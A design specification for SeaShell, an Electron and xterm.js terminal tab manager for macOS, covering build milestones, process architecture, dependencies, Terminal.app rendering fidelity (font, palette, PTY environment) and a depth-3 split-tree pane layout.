# SeaShell — Design Specification

SeaShell is a macOS desktop terminal window manager built from scratch as an Electron application: an Electron shell, xterm.js 6.0.0 for VT rendering, and node-pty 1.1.0 for real PTYs. It presents a tab bar of workspaces, each holding a tiled grid of up to six panes with draggable borders and double-click-to-zoom, plus a collapsible `.gitignore`-aware file explorer on the left. Every pane is a real login shell running an arbitrary command. The single non-negotiable requirement is that a `claude` session inside a SeaShell pane renders identically to the same session in Terminal.app; every rendering, environment, and input decision in this document is subordinate to that. SeaShell additionally surfaces per-pane memory and idle time, because the target machine is a 16 GB Intel MacBook Pro whose owner routinely forgets running Claude Code sessions. It ships as a signed, notarized universal (x86_64 + arm64) binary.

**Status: design approved 2026-07-31; spec revised 2026-07-31 after three-reviewer critique**

---

## 0. Milestones — build order and gates

The spec below is uniformly detailed, which is not the same as uniformly urgent. Build in this order. **M0 is a hard gate: nothing else is built until it passes.** The riskiest unknown in the whole project is whether xterm + WebGL actually reproduces a Claude Code TUI; if it does not, every other section is wasted work, so it is proven first with the smallest possible app.

| # | Scope | Done means | Est. |
|---|---|---|---|
| **M0** | **One window, one pane, no tabs, no grid.** `/bin/zsh -l`; §4.3 env; §4.2 font load (both faces); §4.4 palette; WebGL + `customGlyphs`; §4.6 resize pipeline; §6.6 batcher + ack window. | **§16.4 rows 0–12, 17, 21, 22 pass side-by-side against Terminal.app.** If they do not, stop and redesign. | ~1 wk |
| M1 | Tabs + grid: split tree, auto-insert to 6, drag dividers, pane title bar, zoom, close + kill ladder, the core keybindings (§5.5). | Six panes tile, resize, zoom and close with zero orphaned processes (§16.3 case 10). | ~2 wk |
| M2 | Explorer: lazy `readDir`, `ignore`, ⌘R / refresh-on-focus / refresh-on-expand, drag-to-pane quoting, folder picker + tab cwd. | Tree opens a real repo, hides ignored entries, drags a quoted path into a pane. | ~4 d |
| M3 | Path detection: tokenizer, `statBatch`, link provider, §8.4 mouse rule, §8.6 routing + DENY gate. | Hover underlines only real paths; double-click routes correctly; DENY unit tests green. | ~2 wk |
| M4 | Viewer: read-only text, shiki `github-dark`, size caps. | Opens a 400 KB TS file highlighted without blocking a frame. | ~4 d |
| M5 | Memory / idle: `ps` sweep, status-bar pane total, per-pane badge, byte-derived busy + idle badges. | Status bar tracks a real Claude session; idle badge appears after 15 min. | ~2 d |
| M6 | Persistence: save triggers, atomic write, first-run, restore cards, window-rect validation, single-instance lock. | Quit and relaunch restores the layout and auto-runs nothing. | ~2 d |
| M7 | Universal build, sign, notarize, staple, borrowed-Mac arm64 smoke test. | §15.6 release gate passes; app launches on an M-series Mac. | ~4 d + notarization wait |

Anything marked **Later** anywhere in this document lives in §19 and is not built in v1.

---

## 1. Goals / Non-goals

### Goals

1. **Fidelity.** A Claude Code 2.1.220 TUI in a SeaShell pane is indistinguishable from the same TUI in Terminal.app at the same cols×rows, font, and size, in: **cell grid, glyph advance and baseline, color values, text attributes, cursor shape and behavior, wrapping and reflow, and input handling.** Glyph anti-aliasing may differ, because Chromium rasterizes through Skia and Terminal.app through Core Text, with different hinting, stem darkening, and gamma-corrected blending; that difference is explicitly **out of scope**. The 24 rows of §16.4 (rows 0–23) are the operative definition of "passes fidelity". This goal outranks every other goal.
2. **General terminal tab manager.** A pane may run `zsh`, `claude`, or any command. Nothing about SeaShell is Claude-specific except its measurement calibration.
3. **Tiled workspaces.** Tab bar on top; each tab holds an auto-arranged grid (1 → 2 → 4 → 6) with draggable borders and per-pane zoom.
4. **File explorer.** Lazy, `.gitignore`-aware tree; drag a file into a pane to paste its quoted path.
5. **Real path awareness.** Only paths that `lstat()` on disk are linkified. Double-click opens: text-like → in-app read-only viewer; everything else → macOS default app.
6. **Memory honesty.** A per-pane memory badge and one status-bar total, labelled so it cannot be misread as a share of system RAM.
7. **Non-hostile persistence.** Restore layout, never auto-run anything (one narrow exception: first launch, §11.2).
8. **Universal binary**, Developer ID signed, notarized, stapled.

### Non-goals (explicit, will not be built)

- File **editing** of any kind. The viewer is read-only, permanently.
- SSH or remote session management.
- A plugin system.
- Windows or Linux support.
- A theme editor. SeaShell ships exactly one theme.
- Session recording / replay.
- AI features inside SeaShell itself.
- **Multiple windows.** SeaShell is single-window by design: `state.window` is singular, `render-process-gone` reloads *the* window, and there is no ⌘N.

Additional non-goals derived during design: no terminal multiplexer integration (no tmux, no zellij, no screen); no shell integration beyond the OSC 7 cwd shim and the `SEASHELL_RUN` hook; no split-pane detach/reattach; no per-pane font or color overrides.

---

## 2. Architecture overview

### 2.1 Process split

Two processes. **Main** holds every capability. **Renderer** holds only pixels.

| | Main (Node, full capability) | Renderer (zero capability) |
|---|---|---|
| Owns | node-pty sessions, all `fs`, the `ps` sweep, `lsof`, `shell.openPath`, clipboard, `dialog`, state file, `app://` protocol, window + native menu, terminal font bytes | xterm.js terminals, split-tree layout, tab bar, file tree UI, viewer UI, status bar |
| Never | renders | touches `fs`, `child_process`, `path`, `os`, `process.env`, `require`, or any raw `ipcRenderer` |

PTYs live in **main**, not a `utilityProcess`. Rationale: a second Node process costs ~60 MB resident on a 16 GB machine that already swaps; main does no rendering so it has spare main-thread budget; and persistence explicitly does not restore live sessions, so crash-reattach buys nothing.

```ts
new BrowserWindow({
  width: 1440, height: 900, minWidth: 900, minHeight: 560,
  titleBarStyle: 'hiddenInset',
  backgroundColor: '#000000',
  webPreferences: {
    preload: path.join(__dirname, '../preload/index.js'),
    contextIsolation: true,
    nodeIntegration: false,
    sandbox: true,
    webSecurity: true,
    spellcheck: false,
  },
})
```

All three security flags are already Electron defaults; they are written explicitly so a future edit cannot silently regress them.

The renderer is served from a privileged `app://` scheme, never `file://`:

```ts
protocol.registerSchemesAsPrivileged([
  { scheme: 'app', privileges: { standard: true, secure: true, supportFetchAPI: true } },
])
// after whenReady:
protocol.handle('app', req => net.fetch(pathToFileURL(resolveUnderDistDir(req.url)).toString()))
```

`app.requestSingleInstanceLock()` is called before window creation (§11.3).

### 2.2 App layout

The illustration below is the **N = 4** shape from §5.2's table (`R[ C[p1,p4], C[p2,p3] ]`). It is drawn as a legal tree state on purpose: the depth-3 model (§5.1) makes vertical dividers run the full grid height, so a bottom pane spanning both columns is *inexpressible* and must never appear in a mockup.

```
┌──────────────────────────────────────────────────────────────────────────────┐
│         seashell ×  │  solarbear ×  │  aio ×  │  +                           │  tab bar (32px)
├────────────┬─────────────────────────────────────────────────────────────────┤
│ EXPLORER   │ ┌──────────────────────────┬──────────────────────────┐         │
│ ▾ seashell │ │[1] seashell zsh ● 12MB  ×│[2] src  claude ● 766MB  ×│         │  pane title bar (24px)
│   ▸ docs   │ ├──────────────────────────┤                          │         │
│   ▾ src    │ │ $ npm test               │ ╭────────────────────────╮│         │
│     main   │ │ ✓ 218 passing            │ │ > refactor the layout  ││         │
│     rend…  │ │ $ ▌                      │ ╰────────────────────────╯│         │
│   ▸ test   │ │                          │ ✻ Thinking… (esc to int.)│         │
│   pkg.json │ ├──────────────────────────┤                          │         │
│            │ │[4] node_mod… zsh idle 42m×│                         │         │
│            │ ├──────────────────────────┤                          │         │
│  ◀ collapse│ │ $ ▌                      │                          │         │
│            │ └──────────────────────────┴──────────────────────────┘         │
├────────────┴─────────────────────────────────────────────────────────────────┤
│ panes (Σ RSS) 1.4 GB   ⋮                                                     │  status bar (26px)
└──────────────────────────────────────────────────────────────────────────────┘
     ↑ sidebar               ↑ 9px divider hit strip, 1px visual line
   (260px, ⌘B toggles)
```

Vertical dividers between columns run full grid height. Horizontal dividers exist only inside a column. That is a direct consequence of the depth-3 layout tree (§5.1). The `[N]` indices are 1-based DFS order (column-major), so the lower-left pane is `[4]`, matching §5.2's `R[ C[p1,p4], C[p2,p3] ]`.

**Window dragging.** `titleBarStyle: 'hiddenInset'` removes the title bar, so drag regions are explicit or the window cannot be moved:

- The tab bar strip is the **only** draggable region: `-webkit-app-region: drag`, with `padding-left: 78px` to clear the traffic lights.
- Tabs themselves, the `+` button, every tab close button, and the tab-rename input each carry `-webkit-app-region: no-drag`. On macOS a `no-drag` child of a `drag` region **must** declare it explicitly or the click is consumed by the window drag.
- Nothing else in the app is draggable. In particular the pane title bar is not — it owns double-click-to-zoom (§5.4).
- Main toggles a `.fullscreen` class on `enter-full-screen` / `leave-full-screen`; that class sets `padding-left: 0` because the traffic lights are hidden in fullscreen.

### 2.3 Source tree

```
electron.vite.config.ts   vitest.config.ts   electron-builder.yml
build/entitlements.mac.plist   build/afterPack.cjs
scripts/make-pty-universal.sh  scripts/capture-palette.sh  scripts/verify-universal.sh
scripts/docs-lint.mjs
src/shared/       ipc.ts (channel names + request/response types) · state-schema.ts
src/main/         index.ts · window.ts · menu.ts · ipc-router.ts (single zod-validated registration point)
                  notice.ts (ui:notice emitter, dedupe + ttl)
  pty/            manager.ts · batcher.ts [pure] · env.ts [pure] · zdotdir.ts · reap.ts
  fs/             tree.ts · gitignore.ts [pure] · read.ts · stat-batch.ts
                  path-guard.ts [pure] · route.ts [pure]
  monitor/        sweep.ts (execFile /bin/ps + parse) · ps-parse.ts [pure] · cwd-lsof.ts
  state/          store.ts (atomic io)
  open.ts         font.ts   clipboard.ts
src/preload/      index.ts   (the only file in the repo allowed to import ipcRenderer)
src/renderer/     main.tsx · app.tsx · store.ts (useReducer; reducer exported pure)
  layout/         tree.ts [pure] · auto-arrange.ts [pure] · resize.ts [pure] · minimums.ts [pure]
  tabs/ panes/ explorer/ viewer/ status/ notices/
  term/           terminal.ts · theme.ts · flow.ts · mouse.ts · statcache.ts [pure]
  links/          tokenizer.ts [pure] · cellmap.ts [pure] · provider.ts
test/unit  test/dom  test/pty  test/e2e  test/fixtures
```

Every `[pure]` module imports nothing from `electron`, `fs`, `os`, or `react`, so Vitest runs it in a bare node environment. In particular the tokenizer takes `{home, cwd}` as arguments and never looks anything up (§8.2).

---

## 3. Technology choices

All versions verified against the npm registry on 2026-07-31. Pin exactly (no `^`, no `~`) in `package.json`; renovate manually.

| Package | Version | Justification |
|---|---|---|
| `electron` | 43.2.0 | Node 24.18.0, Chromium 150. Ships both darwin-x64 and darwin-arm64 dists, so a universal build is possible from this Intel host. Electron 40 is EOS. |
| `@xterm/xterm` | 6.0.0 | The emulator. Natively handles every escape sequence Claude Code 2.1.220 emits except OSC 52 (deferred, §19). |
| `@xterm/addon-webgl` | 0.19.0 | WebGL2 renderer. `customGlyphs` vector-draws 128 box-drawing, 60 block-element, 3 shading and 17 Powerline codepoints at exact cell bounds — this is what eliminates border gaps and removes any Nerd Font dependency. |
| `@xterm/addon-fit` | 0.11.0 | `fit()` / `proposeDimensions()`. `fit()` no-ops unless a whole cell boundary is crossed, so per-frame calls during a drag are cheap. |
| `@xterm/addon-unicode11` | 0.9.0 | Unicode 11 wcwidth. Chosen over `@xterm/addon-unicode-graphemes` 0.4.0: grapheme clustering costs per-cell work on every write and Claude Code does not need it. |
| `@xterm/addon-serialize` | 0.14.0 | devDependency. Snapshots a headless buffer for the §16.3 Claude-session fidelity fixture. |
| `@xterm/headless` | 6.0.0 | devDependency. PTY integration tests assert emulator buffer contents with no DOM. |
| `node-pty` | 1.1.0 | Node-API (`node-addon-api ^7.1.0`) → ABI-stable, no `@electron/rebuild`. Ships prebuilt `darwin-x64` **and** `darwin-arm64` binaries. |
| `react` / `react-dom` | 19.2.8 | Tabs + recursive split tree + drag-resize + zoom + virtualized tree + viewer is a large amount of coupled state. The hot path is inside xterm's own renderer, mounted once via `ref` and never re-rendered by React. |
| `typescript` | 7.0.2 | `strict: true`, `noUncheckedIndexedAccess: true`. |
| `vite` | 8.2.0 | Bundler under electron-vite. |
| `electron-vite` | 5.0.0 | Three-target build (main / preload / renderer) with correct externals for node-pty. |
| `@vitejs/plugin-react` | 6.0.5 | React fast refresh in dev. |
| `vitest` | 4.1.10 | v4 `projects` array (the `workspace` file is gone in v4). |
| `@vitest/coverage-v8` | 4.1.10 | Coverage. |
| `happy-dom` | 20.11.1 | DOM environment for the `dom` test project. |
| `@testing-library/react` | (latest at install) | Component tests in the `dom` project. |
| `playwright` | (latest at install) | devDependency. `_electron.launch` drives a real Electron run for the `e2e` project (§16.5) — the only place WebGL context counts, real renderer `onRender`, and real mouse events can be asserted. |
| `zod` | 4.4.3 | **Main-process only.** Validates every inbound IPC payload and the on-disk state file. Never bundled into the renderer. |
| `shiki` | 4.3.1 | Viewer syntax highlighting, JS-regex engine (§9). Chunked/resumable via `grammarState`. |
| `ignore` | 7.0.6 | `.gitignore` semantics (anchoring, negation, `**`). Hand-rolling this is a bug farm. |
| `electron-builder` | 26.15.3 | Universal target, code signing, notarization, DMG + ZIP. |
| `@electron/universal` | 3.0.6 | Transitive; merges the two arch app trees. |
| `@electron/notarize` | 3.1.1 | Transitive; notarytool wrapper. |
| `@electron/rebuild` | 4.2.0 | devDependency, **installed but never run.** Kept only as the documented fallback if a non-N-API native dependency is ever added. |

### Rejected dependencies, with reasons

| Rejected | Reason |
|---|---|
| `@xterm/addon-web-links` | HTTP-only regex; its `activate` opens a browser window. SeaShell's linkifier is a custom `ILinkProvider` over stat-verified paths, and OSC 8 is handled by the core `linkHandler` option. |
| `@xterm/addon-canvas` | The canvas renderer was removed in xterm 6; the published addon still declares a `^5.0.0` peer dependency. WebGL context loss falls back to xterm's **built-in DOM renderer**, per the addon-webgl README. |
| `@xterm/addon-search` | ⌘F find-in-pane was not an approved requirement. Cutting it removes a dependency, a keybinding, a find-bar component, and its focus handling. Deferred (§19). |
| `@xterm/addon-clipboard` | Its only purpose is OSC 52. **Terminal.app does not support OSC 52 at all**, so supporting it is a *deviation* from the fidelity target rather than a requirement of it, and it drags in a custom hardened `IClipboardProvider`. ⌘C / ⌘V go through `clip:read` / `clip:write` (§12) instead. Deferred (§19). |
| `lru-cache` | The renderer stat cache is a `Map` with an insertion-ordered eviction at 4096 and two TTLs — about 20 lines in `src/renderer/term/statcache.ts [pure]`, unit-tested. Not worth a pinned dependency. |
| A native `proc_pidinfo` **Node addon** or a bundled C sweep helper | Would add a compiled artifact to the universal build, the signing set, `postinstall`, `afterPack`, and CI — the highest-risk area of the project — in exchange for a status-bar number. `/bin/ps` supplies everything v1 consumes (§10.1). `phys_footprint` is the documented v1.1 upgrade (§19). |
| `chokidar` | Live filesystem watching is not an approved requirement and is cut from v1 (§7). |
| `tmux` / `zellij` | Settled design decision. |

---

## 4. Terminal fidelity

This section is the spec's load-bearing section. Every value here is a hard requirement.

**The reference is the profile the user actually runs.** Measured on this host: `defaults read com.apple.Terminal 'Default Window Settings'` → `Homebrew`, and `'Startup Window Settings'` → `Homebrew`. Every fidelity value below, and the §16.4 side-by-side, is calibrated against **Homebrew**, not `Basic`. Matching the profile the user sees every day costs nothing — it is still exactly one theme and no theme editor.

### 4.1 Terminal options

```ts
const term = new Terminal({
  fontFamily: '"SF Mono Terminal", Menlo, "Apple Symbols", monospace',
  fontSize: 13,
  lineHeight: 1,
  letterSpacing: 0,
  customGlyphs: true,
  rescaleOverlappingGlyphs: true,
  cursorStyle: 'block',
  cursorBlink: true,
  cursorInactiveStyle: 'outline',
  drawBoldTextInBrightColors: false,
  macOptionIsMeta: true,
  macOptionClickForcesSelection: true,
  altClickMovesCursor: false,
  minimumContrastRatio: 1,
  scrollback: 5000,
  smoothScrollDuration: 0,
  reflowCursorLine: false,
  allowTransparency: false,
  allowProposedApi: true,
  theme: TERMINAL_APP_PALETTE,          // §4.4
  linkHandler: { activate: (_e, uri) => { if (/^https?:\/\//i.test(uri)) shellApi.openExternalHttp(uri) } },
})
term.loadAddon(new Unicode11Addon())
term.unicode.activeVersion = '11'
```

Notes on the non-obvious values. The three profile-derived values are **measurements**, read from the `Homebrew` dict of `com.apple.Terminal` on this host on 2026-07-31, not inferences:

| xterm option | Value | Terminal profile key (Homebrew dict) | Observed |
|---|---|---|---|
| `drawBoldTextInBrightColors` | `false` | `UseBrightBold` | `0` |
| `macOptionIsMeta` | `true` | `useOptionAsMetaKey` | `1` |
| `cursorBlink` | `true` | `CursorBlink` | `1` |
| `cursorStyle` | `'block'` | `CursorType` | `0` (block) |

> These four keys are **absent** from the `Basic` dict, meaning `Basic` uses Terminal.app's factory defaults, which differ. An earlier draft of this spec declared `Basic` the reference while quoting `Homebrew`'s keys; that inconsistency is why §16.4 now opens with row 0.

- `customGlyphs: true` is the single most important flag. It vector-draws the rounded `╭╮╯╰` borders Claude Code uses, all 128 box-drawing codepoints, 60 block elements including U+1FB70–1FB97 sextants, `░▒▓`, and 17 Powerline glyphs, sized to the exact cell. It works only in the WebGL renderer, never the DOM renderer.
- `minimumContrastRatio: 1` means "do nothing". Any other value silently alters Claude Code's colors.
- `altClickMovesCursor: false` is mandatory: its default is `true`, and an Option-click with an empty selection injects a burst of arrow-key bytes into the PTY, which would land in Claude Code's input box.
- `macOptionClickForcesSelection: true` keeps Option+drag doing native selection even while a TUI has mouse tracking on. §8.4 explains why this does not conflict with Option+double-click.

### 4.2 Font

Terminal.app's Homebrew profile names `SFMono-Regular` at 14.0 pt, but Terminal substitutes its own private **`SF Mono Terminal`** face for the terminal grid — that substitution is why the file exists and why it is the only monospace face on this machine carrying Powerline glyphs. Verified by parsing every file in `/System/Library/Fonts`, `/System/Library/Fonts/Supplemental`, `/Library/Fonts`, and Terminal.app's own `Resources/Fonts`: `SF-Mono-Regular.otf` (family `SF Mono`) has **no** U+E0B0/U+E0B2; `SFMono-Terminal.ttf` has both. `/System/Library/Fonts/SFNSMono.ttf` has family `.SF NS Mono` — dot-prefixed, unresolvable by CSS family name.

**Two files must be loaded, not one.** Verified by parsing both on this host:

| File | Bytes | Family (name ID 1) | Subfamily (ID 2) | `fvar` | advance |
|---|---|---|---|---|---|
| `SFMono-Terminal.ttf` | 225,376 | `SF Mono Terminal` | `Light` | yes — `wght` min 294.67, **default 294.67**, max 900 | 1266/2048 = 0.61816 em |
| `SFMonoItalic-Terminal.ttf` | 202,224 | `SF Mono Terminal` | `Light Italic` | yes, same axis | 0.61816 em |

Both under `/System/Applications/Utilities/Terminal.app/Contents/Resources/Fonts/`.

`new FontFace('SF Mono Terminal', buf)` with **no descriptor object** defaults the `font-weight` descriptor to `normal`, i.e. a declared range of 400–400. xterm's WebGL glyph rasterizer then asks for `bold` on SGR 1, Chromium clamps back to 400 and applies **synthetic emboldening**; SGR 3 gets a **synthetic oblique**. Terminal.app uses the real `wght=700` instance and the real italic face. Claude Code uses bold constantly, so this would guarantee a §16.4 row 6 failure — a direct violation of goal 1. Therefore:

```ts
const f = await seashell.app.getTerminalFont()      // {regular, italic} | null
if (f) {
  const reg  = new FontFace('SF Mono Terminal', f.regular, { weight: '295 900', style: 'normal'  })
  const ital = new FontFace('SF Mono Terminal', f.italic,  { weight: '295 900', style: 'italic' })
  await Promise.all([reg.load(), ital.load()])
  document.fonts.add(reg); document.fonts.add(ital)
}
```

before the first `term.open()`. Immediately after, assert and warn (never throw — a warning beats a dead app):

```ts
const okB = document.fonts.check('bold 13px "SF Mono Terminal"')
const okI = document.fonts.check('italic 13px "SF Mono Terminal"')
if (!okB || !okI) log.warn('FONT_SYNTHETIC', { bold: okB, italic: okI })
```

`app:getTerminalFont` returns `{regular: ArrayBuffer, italic: ArrayBuffer} | null`; if either file is unreadable it returns `null` for the pair. Nothing is copied into the app bundle, so nothing is redistributed. On `null`, fall back to `Menlo` at **15px** and emit a `ui:notice` (`FONT_FALLBACK`).

**Font size is not a free choice.** The WebGL renderer computes `device.char.width = Math.floor(charWidth * dpr)`. At DPR 2 the fractional residual per cell for the 0.61816 em advance is: 11px → 0.600, 12px → 0.836, **13px → 0.072**, 14px → 0.309, 15px → 0.545, 16px → 0.781, **17px → 0.018**. Ship **13px**. Menlo (0.60205 em) is only clean at 10px or 15px; Andale Mono (0.60010 em) at 10px. At startup compute `residual = charWidth * devicePixelRatio - Math.floor(charWidth * devicePixelRatio)` and log a warning above 0.15.

> The user's Terminal profile is set to 14 pt, whose residual is 0.309 — unusable in a floor-rounding renderer. 13px is the nearest clean size and 17px is the next one up. The §16.4 side-by-side sets Terminal.app to 13 pt for the duration of the comparison so both sides share a size. Whether the shipped default should be 13px or 17px is §18 open question 2.

### 4.3 PTY environment — the color decision

```
TERM=xterm-256color
COLORTERM            <deleted>
TERM_PROGRAM=SeaShell
TERM_PROGRAM_VERSION=<app.getVersion()>
LANG=<inherited, default en_US.UTF-8>
SEASHELL_PANE_ID=<uuid>
SEASHELL_RUN=<command string, or unset>
ZDOTDIR / SEASHELL_USER_ZDOTDIR       // §6.2
```

**Conflict resolved.** Two research streams disagreed: one recommended `COLORTERM=truecolor`, one recommended deleting it. Deleting it wins, decisively, because of design decision 2. Claude Code 2.1.220's embedded color-depth table (read from the shipped Mach-O) returns 8-bit for `TERM_PROGRAM=Apple_Terminal`, 24-bit for iTerm/WezTerm/ghostty/vscode/HyperTerm/MacTerm, then falls through to `COLORTERM === 'truecolor'` → 24-bit, then `TERM.startsWith('xterm-256')` → 8-bit. Setting `COLORTERM=truecolor` therefore puts Claude Code on the 24-bit code path and produces visibly different shades from Terminal.app — an instant fidelity violation. Plain `xterm-256color` with no `COLORTERM` reproduces Apple Terminal's exact palette path.

There is **no per-pane 24-bit toggle.** An earlier draft carried one. It contradicted §6.1's hard rule that the renderer cannot influence env, it had no wire representation in `pty:spawn`, and `COLORTERM` is read by the child at process start so toggling it on a live pane would do nothing anyway. If truecolor is ever genuinely needed it becomes a whole-app setting applied at spawn, decided then. The unit test asserting `COLORTERM` is absent from `buildEnv()` stays.

**Never set `TERM_PROGRAM=Apple_Terminal`.** Claude Code's `/terminal-setup` for that value backs up, rewrites, and `killall cfprefsd`-es the user's real `~/Library/Preferences/com.apple.Terminal.plist`. Since the `xterm-256color` fallback already yields the identical 8-bit palette, there is no reason to.

The one thing `/terminal-setup` would have installed — Shift+Enter for multi-line input — SeaShell installs itself, so Claude Code works with zero setup. **The rewrite is scoped to full-screen TUIs only:**

```ts
term.attachCustomKeyEventHandler(ev => {
  if (ev.type === 'keydown' && ev.key === 'Enter' && ev.shiftKey && !ev.metaKey && !ev.ctrlKey
      && term.modes.mouseTrackingMode !== 'none') {          // a TUI owns the terminal
    seashell.pty.write(paneId, '\x1b\r')   // ESC CR — exactly what /terminal-setup binds
    return false
  }
  if (ev.metaKey) return false             // every Cmd chord belongs to the app menu (§5.5)
  return true
})
```

Rewriting Shift+Enter unconditionally would break plain shell panes: at a zsh prompt in emacs mode `\e\r` is not `accept-line`, it is an unbound meta sequence that beeps or self-inserts — a fidelity deviation from Terminal.app in exactly the direction goal 1 forbids. Gating on `mouseTrackingMode` uses the same live-mode signal §8.4 already trusts. §16.4 row 23 asserts Shift+Enter at a bare zsh prompt behaves as Terminal.app does.

The `ev.metaKey` guard is unconditional (an earlier draft excluded `'a'`). Letting ⌘A through to xterm's internal `SELECT_ALL` meant two handlers fired for one chord and made the §5.5 `appFocusZone` dispatch non-authoritative. Now the zone handler is the single owner and calls `term.selectAll()` itself.

### 4.4 Palette

The 16 ANSI colors are **not** overridden by any profile on this host — verified by dumping `com.apple.Terminal`: neither `Basic` nor `Homebrew` carries `ANSI*Color` keys, so both inherit Terminal.app's hardcoded default palette, and Terminal's `sdef` exposes no ANSI color properties. The **profile-specific** colors, however, *are* stored, as `NSKeyedArchiver` blobs, and are therefore fully scriptable — no eyedropper needed. Decoded from `Homebrew` on this host:

| Role | Archived value | Notes |
|---|---|---|
| `background` | `NSWhite` grayscale `0`, **alpha 0.748** | Translucent black. Ship the **flattened opaque equivalent `#000000`**; `allowTransparency: false` (§4.1) stays. |
| `foreground` | `NSRGB 0.15686275 0.99607849 0.078431375` | `#28FE14` |
| `cursor` | `NSRGB 0.21960786 0.99607849 0.15294118` | `#38FE27` |
| `selectionBackground` | calibrated RGB `0.034578395 0 0.91326531`, alpha `0.65` | Flatten over `#000000`; the capture script does the calibrated→sRGB conversion. |
| bold text | `NSRGB 0 1 0` (`#00FF00`) | **Documented deviation:** xterm's `ITheme` has no bold-foreground slot. With `UseBrightBold=0`, bold in SeaShell uses `foreground` (`#28FE14`) where Terminal.app uses `#00FF00`. The two greens differ by 24/255 on one channel. §16.4 row 6 records this as the one known, accepted color difference. |

`scripts/capture-palette.sh` is committed and is the only sanctioned capture path. It:

1. `defaults export com.apple.Terminal -` → decodes the five archived profile colors above with `plistlib` and converts to sRGB hex.
2. Prints the 16-color ramp in Terminal.app (`for i in $(seq 0 15); do printf '\e[48;5;%dm    \e[0m' $i; done`), `screencapture -R <rect> -t png` of the strip, and samples each swatch centre from the PNG.
3. Writes `src/renderer/term/palette.json` and commits `test/fixtures/palette-swatches.png` alongside it as the reproducible fixture.

That JSON is the xterm `ITheme`. Because NSColor archives use device/calibrated RGB while Chromium composites in the display's P3 profile on this Retina panel, main must also set, before `app.whenReady()`:

```ts
app.commandLine.appendSwitch('force-color-profile', 'srgb')
```

**Acceptance, executable.** The same script re-runs against a SeaShell screenshot and diffs sampled pixels: every channel within **±2/255**. On failure: re-capture with Digital Color Meter set to "Display native values" and convert, and record the delta in the commit message. **A channel delta above 5 blocks release.**

A palette unit test asserts `palette.json` has exactly 16 ANSI entries plus `background`, `foreground`, `cursor`, and `selectionBackground`, and matches a committed reference hash — so a silent palette regression fails CI rather than waiting for a manual checklist run.

SeaShell ships exactly one theme and no editor. The fidelity comparison in §16.4 runs against Terminal.app's **Homebrew** profile so both sides use the same font, size, and colors.

### 4.5 Renderer

WebGL2 via `@xterm/addon-webgl`, one context per pane. Chromium force-loses the oldest context beyond ~16 live contexts per renderer, so 6 tabs × 6 panes = 36 would silently blank panes.

**LRU over WebGL addons, keyed by tab.** Retain contexts for the **2 most-recently-active tabs** (≤ 12 live, still under the stock 16 cap) and dispose only when a third tab would exceed that. An earlier draft disposed all six contexts on every tab deactivation and recreated them on activation; that produces a GL context-creation burst on exactly the dual-GPU 2019 MBP that risk 10 says must avoid GL churn, plus a visible hitch on every ⌘⇧] press. Belt-and-braces, in main:

```ts
app.commandLine.appendSwitch('max-active-webgl-contexts', '32')
```

On `webgl.onContextLoss`, dispose the addon (DOM renderer takes over), retry a fresh `WebglAddon` once after 1000 ms, and on a second loss stay on DOM permanently for that pane and log it.

**The DOM renderer must never be a steady state**, because `customGlyphs` does not apply to it and box borders will show 1px gaps. It is only the transient state for the third-and-older tab and the post-context-loss fallback. Note that the DOM renderer is a supported, reachable state, which is why the CSP must permit xterm's dynamically inserted `<style>` elements (§13.1).

**GPU**: creating any GL context on this dual-GPU 2019 MBP can promote it to the AMD Radeon Pro 5300M and pin it there, adding 10–15 W and triggering this machine's documented thermal throttling. Set `NSSupportsAutomaticGraphicsSwitching: true` via electron-builder `mac.extendInfo`. Acceptance threshold, measured with Activity Monitor's GPU history: with 6 panes open and no output, total CPU < 2% and the discrete GPU not engaged.

Hidden panes cost nothing: xterm 6's `RenderService` registers an `IntersectionObserver(threshold: 0)` on the screen element and pauses refreshes while off-screen, flushing a full refresh on re-intersection. The write/parse path is independent of rendering, so no data is lost. `WebglRenderer.handleBlur()` pauses the cursor blink manager, so only the focused pane blinks.

### 4.6 Resize pipeline

```
geometry change → rAF → layoutTab() → fitAddon.fit() on VISIBLE panes only
  → term.onResize → 80 ms trailing debounce per pane → IPC pty:resize → pty.resize(cols, rows)
```

Order is fixed: **xterm first, PTY second.** Skip the `pty.resize` when `{cols, rows}` is unchanged from the last sent value. Verified on this host with a `pty.fork` + `TIOCSWINSZ` harness: issuing identical dimensions delivers **no** SIGWINCH (BSD `ttioctl` compares `winsize` before signalling), so redundant calls are free; changed dimensions always signal.

`reflowCursorLine` stays `false` (the default) so the shell owns reflow. Alt-screen content is not reflowed by xterm, which is correct for a TUI. No rounding compensation in layout: set `.pane { background: var(--term-bg) }` so FitAddon's sub-cell remainder is invisible.

### 4.7 Flow control

Spawn with `encoding: null` so `onData` yields raw `Buffer`s, and forward raw `Uint8Array` to `term.write()`. Encoding to a JS string in main would corrupt multi-byte UTF-8 sequences split across reads — the single most likely source of Claude Code rendering artifacts. `handleFlowControl: false`; SeaShell drives `pause()`/`resume()` itself (§6.6).

---

## 5. Layout engine

### 5.1 Data model — depth-3 n-ary split tree

`Row → Col[] → Pane[]`. The root is always a **row** node whose children are all **column** nodes whose children are all **pane** leaves. Depth is capped at 3 by invariant, giving the tmux "tiled" shape.

Rejected alternative: a rows×cols grid with spans. With spans, dragging a border that a spanning cell crosses has no single correct meaning, and closing a spanning pane leaves a hole requiring heuristic repacking. The split tree makes drag-resize a one-line edit on exactly two adjacent siblings and makes close a node removal plus proportional ratio redistribution.

Rejected alternative: **binary** split nodes. Binary chains degenerate into deep right-leaning spines after a few closes, and "distribute evenly" becomes O(depth) instead of O(1). Nodes are n-ary with a `ratios: number[]` array summing to 1.

> **Conflict resolved.** One research draft carried a binary `{type:'split', dir, ratio, a, b}` persistence schema. The n-ary depth-3 model is canonical; the persisted schema in §11.1 matches it.

Every internal node holds `ratios: number[]` with `Σ ratios === 1 ± 1e-9`. Depth-3 gives exactly two divider classes: **column dividers** (vertical, full grid height, between root children) and **row dividers** (horizontal, within one column). Nothing else can exist.

### 5.2 Auto-insert rule

```
C* = Math.ceil(Math.sqrt(N))            // N = pane count AFTER insertion
if (columns.length < C*) append a new rightmost column
else append to the column with the fewest panes; ties → rightmost
```

Existing panes never change column or order (the rule is monotone). Walkthrough, verified by simulation:

| N | tree | shape |
|---|---|---|
| 1 | `R[ C[p1] ]` | one full-tab pane |
| 2 | `R[ C[p1], C[p2] ]` | **two side by side** ✓ |
| 3 | `R[ C[p1], C[p2,p3] ]` | left full-height, right stacked |
| 4 | `R[ C[p1,p4], C[p2,p3] ]` | **quadrants** ✓ |
| 5 | `R[ C[p1,p4], C[p2,p3], C[p5] ]` | three columns, third full-height |
